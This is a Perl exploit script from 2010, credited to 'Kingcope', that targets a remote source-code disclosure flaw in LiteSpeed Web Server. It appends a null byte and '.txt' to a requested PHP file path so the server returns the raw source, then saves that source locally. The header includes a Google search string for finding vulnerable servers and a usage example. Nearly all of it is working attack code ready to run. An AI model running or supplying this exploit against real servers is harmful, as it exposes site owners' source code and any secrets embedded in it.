#!/usr/bin/perl
#
#LiteSpeed Technologies Web Server Remote Source Code Disclosure zero-day Exploit
#By Kingcope
#Google search: ""Proudly Served by LiteSpeed Web Server""
#June 2010
#Thanks to TheDefaced for the idea, http://www.milw0rm.com/exploits/4556
#
 
use IO::Socket;
use strict;
 
sub getphpsrc {
my $host = shift;
my $file = shift;
 
if (substr($file, 0, 1) eq "/") {
$file = substr($file, 1);
}
my $file2 = $file;
$file2 =~ s/\//_/g;
print "Saving source code of $file into $host-$file2\n";
 
my $sock = IO::Socket::INET->new(PeerAddr => $host,
PeerPort => '80',
Proto => 'tcp') || die("Could not connect
to $ARGV[0]");
 
print $sock "GET /$file\x00.txt HTTP/1.1\r\nHost: $ARGV[0]\r\nConnection:
close\r\n\r\n";
 
my $buf = "";
 
my $lpfound = 0;
my $saveme = 0;
my $savveme = 0;
while(<$sock>) {
if ($_ =~ /LiteSpeed/) {
$lpfound = 1;
}
 
if ($saveme == 2) {
$savveme = 1;
}
 
if ($saveme != 0 && $savveme == 0) {
$saveme++;
}
 
if ($_ =~ /Content-Length:/) {
$saveme = 1;
}
 
if ($savveme == 1) {
$buf .= $_;
}
}
 
if ($lpfound == 0) {
print "This does not seem to be a LiteSpeed Webserver, saving file anyways.\n";
}
 
open FILE, ">$host-$file2";
print FILE $buf;
close FILE;
print "Completed.\n";
}
 
print "LiteSpeed Technologies Web Server Remote Source Code Disclosure Exploit\n";
print "By Kingcope\n";
print "June 2010\n\n";
 
if ($#ARGV != 1) {
print "Usage: perl litespeed.pl <domain/ip> <php file>\n";
print "Example: perl litespeed.pl www.thedomain.com index.php\n";
exit(0);
}
 
getphpsrc($ARGV[0], $ARGV[1]);
 
print "Operation Completed :>.\n";